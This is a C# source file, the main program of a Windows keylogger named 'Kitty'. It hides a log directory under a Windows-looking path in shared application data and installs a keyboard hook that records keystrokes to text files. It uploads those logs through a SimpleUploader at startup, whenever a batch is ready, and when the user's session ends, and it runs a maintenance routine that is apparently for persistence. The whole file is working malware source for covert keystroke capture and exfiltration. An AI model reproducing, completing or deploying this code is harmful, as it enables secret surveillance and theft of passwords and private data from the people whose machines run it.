using Kitty.Stash;
using Kitty.Win32;
using System;

#if DEBUG

using System.Diagnostics;

#endif

using System.IO;
using System.Windows.Forms;

namespace Kitty
{
    internal class Program
    {
        private static ApplicationMaintain applicationMaintain;
        private static string keyloggerDir;
        private static TextFileFactory stashProvider;

        private static void MaintainApplication()
        {
            applicationMaintain = new ApplicationMaintain();
            applicationMaintain.MaintainAsync();
        }

        private static void FindStashDirectory()
        {
            string appDataDir = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
            keyloggerDir = Path.Combine(appDataDir, "Windows", Application.ProductName);
            if (!Directory.Exists(keyloggerDir))
                Directory.CreateDirectory(keyloggerDir);
        }

        private static async void SetupKeylogger()
        {
            stashProvider = new TextFileFactory(keyloggerDir);
            stashProvider.ReadyToUpload += StashProvider_ReadyToUpload;
            if (!Keylogger.Hook(stashProvider))
            {
#if DEBUG
                Debug.WriteLine("Keylogger setup error: " + Win32API.GetLastErrorAsMessage());
#endif
            }
            Microsoft.Win32.SystemEvents.SessionEnding += SystemEvents_SessionEnding;
            await new SimpleUploader(stashProvider).UploadAsync();
        }

        private static void SystemEvents_SessionEnding(object sender, Microsoft.Win32.SessionEndingEventArgs e)
        {
            new SimpleUploader(stashProvider).UploadAsync().Wait();
        }

        private static async void StashProvider_ReadyToUpload(object sender, EventArgs e)
        {
            await new SimpleUploader(stashProvider).UploadAsync();
        }

        private static void Main(string[] args)
        {
            MaintainApplication();
            FindStashDirectory();
            SetupKeylogger();
            ApplicationInformation.VerifyApplition();
            Application.Run();
            Keylogger.Unhook();
        }
    }
}